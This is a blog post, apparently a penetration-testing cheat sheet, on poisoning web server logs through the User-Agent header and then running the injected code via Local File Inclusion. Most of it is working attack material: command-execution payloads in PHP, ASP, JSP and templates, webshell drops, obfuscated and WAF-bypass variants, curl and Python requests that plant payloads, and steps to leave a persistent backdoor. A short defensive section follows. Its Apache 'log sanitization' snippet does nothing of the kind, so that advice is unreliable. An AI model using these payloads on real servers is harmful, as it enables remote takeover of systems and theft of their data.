---
layout: post
title: Log Poisoning via User-Agent
date: 2025-04-10 17:19 +0300
categories: [Web Security, Server-Side Attacks]
---


---
layout: post
title: Log Poisoning via User-Agent
date: 2025-04-10 17:19 +0300
categories: [Web Security, Server-Side Attacks]
---

## Introduction

Log poisoning is an attack technique where malicious code is injected into server log files which are then executed when the log file is viewed or processed. Log poisoning via User-Agent is a specific approach that leverages the HTTP User-Agent header to inject malicious payloads into web server logs. This technique is often combined with Local File Inclusion (LFI) vulnerabilities to achieve remote code execution.

## How Log Poisoning via User-Agent Works

1. Web servers log HTTP requests including the User-Agent header
2. Attacker sends requests with malicious code in the User-Agent header
3. Web server records the malicious User-Agent string in its logs
4. Attacker exploits an LFI vulnerability to include the poisoned log file
5. When the log file is included, the injected code is executed by the server

## Common Log File Locations by Web Server

### Apache

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache/access.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/opt/lampp/logs/access_log
/opt/lampp/logs/error_log
/xampp/apache/logs/access.log
/xampp/apache/logs/error.log
/etc/httpd/logs/access_log
/etc/httpd/logs/error_log
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
```

### Nginx

```
/var/log/nginx/access.log
/var/log/nginx/error.log
/usr/local/nginx/logs/access.log
/usr/local/nginx/logs/error.log
/opt/nginx/logs/error.log
C:/nginx/logs/error.log
```

### IIS

```
C:\inetpub\logs\LogFiles\W3SVC1\
%SystemDrive%\inetpub\logs\LogFiles\
```

### Tomcat

```
/var/log/tomcat*/catalina.out
/usr/local/tomcat/logs/catalina.out
C:/Program Files/Apache Software Foundation/Tomcat/logs/catalina.out
```

## Basic Log Poisoning Payloads by Language

### PHP

```
# Basic PHP code execution via User-Agent
User-Agent: <?php system($_GET['cmd']); ?>

# Eval execution
User-Agent: <?php eval($_REQUEST['cmd']); ?>

# File write and execution
User-Agent: <?php file_put_contents('/var/www/html/shell.php', '<?php system($_GET[\'cmd\']); ?>'); ?>

# Base64 encoded payload (bypass WAF)
User-Agent: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
```

### ASP/ASP.NET

```
# Classic ASP execution
User-Agent: <% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>

# ASP.NET execution
User-Agent: <% System.Diagnostics.Process.Start(Request.QueryString["cmd"]); %>
```

### JSP

```
# JSP execution
User-Agent: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# More comprehensive JSP shell
User-Agent: <% if(request.getParameter("cmd")!=null){ Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>
```

### Python (WSGI/Flask/Django)

{% raw %}
```python
User-Agent: <% import os; os.system(request.args.get('cmd')) %>
User-Agent: {% import os %}{{os.popen(request.args.get('cmd')).read()}}
```
{% endraw %}

## Advanced Log Poisoning Techniques

### Multi-stage Payloads

```
# Stage 1: Drop a more complete webshell
User-Agent: <?php file_put_contents('/var/www/html/shell.php', '<?php if(isset($_POST["cmd"])){$cmd=$_POST["cmd"];system($cmd);} __halt_compiler();?>'); ?>

# Stage 2: Use the LFI to load the log, causing creation of shell.php
http://vulnerable.com/index.php?page=../../../var/log/apache2/access.log

# Stage 3: Access the created shell
http://vulnerable.com/shell.php
```

### Session File Poisoning

```
# Poison session variables (PHP)
User-Agent: <?php system('id'); ?>

# Include PHP session files
http://vulnerable.com/index.php?page=../../../var/lib/php/sessions/sess_[SESSION_ID]
```

### Obfuscated Payloads for Log Poisoning

```
# Concatenation
User-Agent: <?php $x='sy'.'st'.'em'; $x($_GET['cmd']); ?>

# Character encoding tricks
User-Agent: <?php $x="\x73\x79\x73\x74\x65\x6d"; $x($_GET['cmd']); ?>

# Variable functions
User-Agent: <?php $x=$_GET['func']; $x($_GET['cmd']); ?>
```

## Log Poisoning + LFI Exploitation Steps

### Step 1: Probe for LFI vulnerability
```
http://vulnerable.com/index.php?page=../../../etc/passwd
```

### Step 2: Identify accessible log files
```
http://vulnerable.com/index.php?page=../../../var/log/apache2/access.log
```

### Step 3: Poison the log file with a User-Agent payload
```
# Using curl with a custom User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://vulnerable.com/

# Using Burp Suite to modify User-Agent header
```

### Step 4: Trigger the code execution via LFI and cmd parameter
```
http://vulnerable.com/index.php?page=../../../var/log/apache2/access.log&cmd=id
```

### Step 5: Establish persistence (optional)
```
# Create a backdoor via log poisoning
http://vulnerable.com/index.php?page=../../../var/log/apache2/access.log&cmd=echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/backdoor.php

# Access the backdoor
http://vulnerable.com/backdoor.php?cmd=id
```

## WAF Bypass Techniques

### Character Encoding

```
# URL encoding
User-Agent: %3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E

# Double encoding
User-Agent: %253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E
```

### Alternative PHP Syntax

```
# Short tags (when enabled)
User-Agent: <? system($_GET['cmd']); ?>

# Script tags with language attribute
User-Agent: <script language="php">system($_GET['cmd']);</script>
```

### Non-standard Execution Functions

```
User-Agent: <?php passthru($_GET['cmd']); ?>
User-Agent: <?php shell_exec($_GET['cmd']); ?>
User-Agent: <?php exec($_GET['cmd']); ?>
User-Agent: <?php `$_GET['cmd']`; ?>
User-Agent: <?php echo `$_GET['cmd']`; ?>
```

### Filter Evasion with PHP wrappers

```
# Encode payload with base64 wrappers
http://vulnerable.com/index.php?page=php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg%3D%3D
```

## Other Logs That Can Be Poisoned

```
# SSH auth logs
/var/log/auth.log
/var/log/secure

# Mail logs
/var/log/maillog
/var/log/mail.log

# FTP logs
/var/log/vsftpd.log
/var/log/proftpd/proftpd.log

# MySQL/MariaDB logs
/var/log/mysql/mysql.log
/var/lib/mysql/mysql-error.log

# Other web server logs
/var/log/httpd/*
```

## Detection and Prevention

### Detection

1. Monitor logs for suspicious User-Agent strings containing:
   - PHP tags: `<?`, `<?php`, `<%`
   - JavaScript tags: `<script>`
   - Encoding patterns: `\x`, `%`, `base64`

2. Use Web Application Firewalls (WAFs) or SIEM solutions to detect:
   - Abnormally long User-Agent strings
   - User-Agent strings containing code execution functions
   - Rapid requests with changing malicious User-Agents

### Prevention

1. **Secure File Inclusion:**
   - Use whitelisting approach for file inclusion
   - Validate and sanitize user input
   - Avoid exposing error messages that reveal file paths

2. **Implement Proper Access Controls:**
   - Restrict web server permissions
   - Use least privilege principle 
   - Separate log files from web-accessible directories

3. **Secure Logging Practices:**
   - Escape or encode log entries
   - Use centralized logging systems
   - Log rotation and encryption

4. **Configure Web Servers Securely:**
   ```apache
   # Apache: Log sanitization for User-Agent
   LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-agent}i\"" combined
   ```

5. **For PHP Applications:**
   ```php
   // Disable allow_url_include
   // In php.ini:
   allow_url_include = Off
   
   // For file inclusion, use strict validation
   $allowed_files = ['page1.php', 'page2.php'];
   $file = $_GET['page'] ?? 'default.php';
   
   if (in_array($file, $allowed_files)) {
       include $file;
   } else {
       include 'default.php';
   }
   ```

## Real-world Examples

### CVE-2019-14936 - OpenEMR Log Poisoning

OpenEMR before 5.0.2 was vulnerable to log poisoning through the PoC test page which logged User-Agent strings without sanitization, allowing PHP code injection.

### CVE-2018-5950 - Subrion CMS Log Poisoning

Subrion CMS version 4.2.1 contained a vulnerability allowing attackers to poison log files via the User-Agent header, which could then be leveraged through an LFI vulnerability.

## Log Poisoning Detection Tools

1. **ModSecurity WAF** - Rules to detect code in User-Agent headers
2. **OWASP ZAP** - Can detect LFI vulnerabilities
3. **Burp Suite Professional** - Scanner can detect some log injection/LFI issues
4. **Custom log monitoring scripts** - Using grep/regex to find malicious patterns

## Testing Log Poisoning (Ethical Hacking)

```bash
# Using curl to test log poisoning
curl -A "<?php phpinfo(); ?>" http://vulnerable.com/

# Using Python requests
import requests
headers = {"User-Agent": "<?php system($_GET['cmd']); ?>"}
requests.get("http://vulnerable.com/", headers=headers)

# Check if poisoning worked
http://vulnerable.com/index.php?page=../../../var/log/apache2/access.log&cmd=id
```

## References

- [OWASP File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [HackTricks - Log Poisoning](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [Log Poisoning - Riyaz Walikar](https://www.youtube.com/watch?v=qii-4l5QMTk)

